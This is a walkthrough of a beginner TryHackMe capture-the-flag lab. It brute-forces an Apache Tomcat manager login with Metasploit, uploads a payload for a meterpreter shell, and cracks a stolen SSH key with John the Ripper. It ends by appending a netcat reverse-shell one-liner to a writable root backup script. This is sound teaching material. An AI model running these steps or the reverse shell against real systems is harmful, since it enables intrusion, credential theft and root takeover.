CTF Link: tryhackme.com/jr/thecyb3rctfv1
Link 2: https://tryhackme.com/jr/thecyberctf0x1

---

Level: Easy (For Beginners)

## **Methodology:**

**Network scanning**
- nmap
- naabu 

**Enumeration**
-   Abusing HTTP

**Exploitation**
-   Metasploit
-   John the Ripper

**Privilege Escalation**
-   writable script
-   Capture the Flag

---

### **Network Scanning**

Initially, we will scan the network to find the Victim machine IP using the netdiscover command.

We have the machine's ip: `10.10.139.12`

**naabu** + **Nmap**

Further, we ran scan for open port enumeration where we found the following port details:

- `echo 10.10.139.12 | naabu -nmap-cli 'nmap -sV -oX nmap-output'`

According to the Nmap output, we get
-   on port 22 SSH server running (OpenSSH)
-   on port 8080 HTTP service running (Apache tomcat)
- ![[Pasted image 20220925224028.png]]

### **Enumeration**

**Abusing HTTP**

Now let’s see if we can get any interesting information from port 8080. Because the Apache Tomcat Server is running on port 8080, we can see the result right away in the browser.

We note the Tomcat version number: 9.0.52
> URL:  **10.10.139.12:8080**
- ![[Pasted image 20220925224228.png]]

Here is a Login page
- ![[Pasted image 20220925224812.png]]

### **Exploitation**

**Metasploit**

Now, let’s start msfconsole. We will be using the auxiliary scanner to bruteforce tomcat manager login. Here we are using Metasploit default wordlist for password brute force attack.

- msfconsole 
- ![[Pasted image 20220925224745.png]]

- > `search tomcat login`
- 
![[Pasted image 20220925224926.png]]
- `use 0`
- `options` 
- ![[Pasted image 20220925225003.png]]
- `set RHOSTS 10.10.139.12`
- `exploit`
- ![[Pasted image 20220925225346.png]]
- tomcat:role1
- login

- Upload functionality
- ![[Pasted image 20220925225652.png]]

- `ifconfig`
- my vpn ip: `10.17.66.156`
- ![[Pasted image 20220925230031.png]]


- `search tomcat upload mgr`
- ![[Pasted image 20220925225753.png]]

- use 1
- options
	- `set HttpUsername tomcat`
	- `set HttpPassword role1`
	- `set RHOSTS 10.10.139.12`
	- `set RPORT 8080`
	- `set LHOST 10.17.66.156`
	- ![[Pasted image 20220925230425.png]]
- exploit
	- ![[Pasted image 20220925230522.png]]

After getting the meterpreter shell we navigate to the ‘home’ directory and there we can find a sub-directory named ‘thales’. Entering the ‘thales’ directory we get two files: **user.txt** and **notes.txt.** We also find a **.ssh** directory.

- `cd /home`
- `ls`
- `cd thales`
- `ls`
	![[Pasted image 20220925231316.png]]

We observe that the public key (id_rsa.pub) and the private key(id_rsa) are present on the victim machine. The private key is used to login. So now we proceed to download the private key onto our kali machine.


cd .ssh

ls

download id_rsa /root/Desktop
![[Pasted image 20220925232031.png]]


locate ssh2john

/usr/share/john/ssh2john.py id_rsa > sshhash

john --wordlist=/usr/share/wordlists/rockyou.txt sshash
![[Pasted image 20220925232934.png]]

found: vodka06

go back to your meterpreter
- `shell`

After we get a shell, we will upgrade our non-interactive shell to a partially interactive one using the following command:
- `python3 -c 'import pty;pty.spawn("/bin/bash")'`
- `export TERM=xterm`

Since we have cracked the password of user ‘thales’, let’s switch to the thales user.
`su thales`
After switching to thales user, we use the command “**id**” to know about the real and effective ‘user and group’ IDs. We find that thales is a non-root user.

![[Pasted image 20220925233823.png]]

cat the users.txt now

We now use “ sudo -l “ to check which commands can be run as root by the user thales.

- `sudo -l`

We find that user thales does not have the ability to run any command as root. So now we navigate around in search of some interesting files.

We get a hint on note.txt that a backup script is prepared for us in the directory **/usr/local/bin/backup.sh**

![[11 1.png]]

Now, let’s go and check the backup.sh file. We investigate and find that this file has read, written, and execute permissions and the file is owned by the root.

- `cat /usr/local/bin/backup.sh`
- `ls -la /usr/local/bin/backup.sh`

![[12.png]]


---

### Privilege Escalation

Since the backup.sh is writable thus we can edit this script by injecting reverse shell payload and expect to get root shell access.

On our attacking machine ( kali ) we will start a Netcat listener to receive the shell, on port 8888

`nc -lvp 8888`

Execute the following command in the terminal to append the backup.sh script for injecting malicious payload.

`echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.17.6.180 8888 >/tmp/f" >> /usr/local/bin/backup.sh`

since it was a backup script that run automatically, thus it will give root privilege reverse shell over port 8888.

**Capture the root flag**

- `id`
- `cd /root`
- `ls`
- `cat root.txt`

![[Pasted image 20221210182443.png]]
